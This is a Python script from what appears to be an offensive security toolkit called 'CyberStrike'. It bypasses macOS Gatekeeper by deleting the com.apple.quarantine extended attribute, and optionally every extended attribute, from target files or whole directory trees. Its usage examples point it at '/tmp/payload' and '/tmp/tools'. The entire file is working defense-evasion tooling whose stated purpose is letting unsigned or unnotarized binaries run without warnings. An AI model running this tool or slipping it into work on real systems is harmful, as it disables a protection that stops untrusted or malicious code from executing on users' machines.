#!/usr/bin/env python3
"""
gatekeeper_bypass.py — Remove macOS quarantine xattr to bypass Gatekeeper.

Removes the com.apple.quarantine extended attribute from files/directories,
allowing unsigned or unnotarized binaries to execute without Gatekeeper
warnings or blocks.

No root required for user-owned files.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path


QUARANTINE_ATTR = "com.apple.quarantine"


class GatekeeperBypasser:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.success_count = 0
        self.fail_count = 0
        self.skip_count = 0

    def print_banner(self):
        print("=" * 60)
        print("CyberStrike — Gatekeeper Bypass (macOS)")
        print("=" * 60)
        print(f"PID:       {os.getpid()}")
        print(f"Target:    {self.args.path}")
        print(f"Recursive: {self.args.recursive}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 60)
        print()

    def signal_handler(self, _signum, _frame):
        self.running = False

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record), flush=True)
        else:
            status = record.get("status", "N/A")
            path = record.get("path", "N/A")
            print(f"[{status:<10}] {path}", flush=True)

    def has_quarantine(self, file_path):
        """Check if file has quarantine xattr."""
        try:
            result = subprocess.run(
                ["xattr", "-l", str(file_path)],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                return QUARANTINE_ATTR in result.stdout
        except Exception:
            pass
        return False

    def get_quarantine_value(self, file_path):
        """Get the quarantine xattr value."""
        try:
            result = subprocess.run(
                ["xattr", "-p", QUARANTINE_ATTR, str(file_path)],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if result.returncode == 0:
                return result.stdout.strip()
        except Exception:
            pass
        return None

    def remove_quarantine(self, file_path):
        """Remove quarantine xattr from a single file."""
        path = Path(file_path)
        if not path.exists():
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "path": str(path),
                    "status": "not_found",
                    "had_quarantine": False,
                    "removed": False,
                    "verified": False,
                }
            )
            self.fail_count += 1
            return

        had_quarantine = self.has_quarantine(path)
        quarantine_value = self.get_quarantine_value(path) if had_quarantine else None

        if not had_quarantine:
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "path": str(path),
                    "status": "no_quarantine",
                    "had_quarantine": False,
                    "removed": False,
                    "verified": True,
                }
            )
            self.skip_count += 1
            return

        try:
            result = subprocess.run(
                ["xattr", "-d", QUARANTINE_ATTR, str(path)],
                capture_output=True,
                text=True,
                timeout=5,
            )
            removed = result.returncode == 0

            verified = not self.has_quarantine(path) if removed else False

            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "path": str(path),
                    "status": "removed" if removed and verified else "failed",
                    "had_quarantine": True,
                    "quarantine_value": quarantine_value or "",
                    "removed": removed,
                    "verified": verified,
                    "error": result.stderr.strip() if not removed else "",
                }
            )

            if removed and verified:
                self.success_count += 1
            else:
                self.fail_count += 1

        except Exception as e:
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "path": str(path),
                    "status": "error",
                    "had_quarantine": True,
                    "removed": False,
                    "verified": False,
                    "error": str(e),
                }
            )
            self.fail_count += 1

    def remove_all_xattrs(self, file_path):
        """Remove ALL extended attributes (not just quarantine)."""
        try:
            subprocess.run(
                ["xattr", "-c", str(file_path)],
                capture_output=True,
                text=True,
                timeout=5,
            )
        except Exception:
            pass

    def process_path(self, target_path):
        """Process a single path or directory recursively."""
        path = Path(target_path)

        if not path.exists():
            self.emit(
                {
                    "timestamp": datetime.now().isoformat(),
                    "path": str(path),
                    "status": "not_found",
                    "had_quarantine": False,
                    "removed": False,
                    "verified": False,
                }
            )
            return

        if path.is_file() or (path.is_dir() and not self.args.recursive):
            self.remove_quarantine(path)
            if self.args.clear_all:
                self.remove_all_xattrs(path)
            return

        if path.is_dir() and self.args.recursive:
            self.remove_quarantine(path)
            if self.args.clear_all:
                self.remove_all_xattrs(path)

            for item in sorted(path.rglob("*")):
                if not self.running:
                    break
                self.remove_quarantine(item)
                if self.args.clear_all:
                    self.remove_all_xattrs(item)

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        self.process_path(self.args.path)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- gatekeeper_bypass summary ---")
        print(f"Files processed: {self.event_count}")
        print(f"Quarantine removed: {self.success_count}")
        print(f"Already clean: {self.skip_count}")
        print(f"Failed: {self.fail_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Remove macOS quarantine xattr to bypass Gatekeeper.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 gatekeeper_bypass.py --path /tmp/payload\n"
            "  python3 gatekeeper_bypass.py --path /tmp/tools --recursive\n"
            "  python3 gatekeeper_bypass.py --path /tmp/tools --recursive --clear-all\n"
            "  python3 gatekeeper_bypass.py --path /tmp/payload --json-output\n"
        ),
    )
    parser.add_argument("--path", type=str, required=True, help="Target file or directory path")
    parser.add_argument("--recursive", action="store_true", default=False, help="Process directories recursively")
    parser.add_argument(
        "--clear-all",
        action="store_true",
        default=False,
        help="Remove ALL xattrs, not just quarantine",
    )
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    bypasser = GatekeeperBypasser(args)
    bypasser.run()


if __name__ == "__main__":
    main()
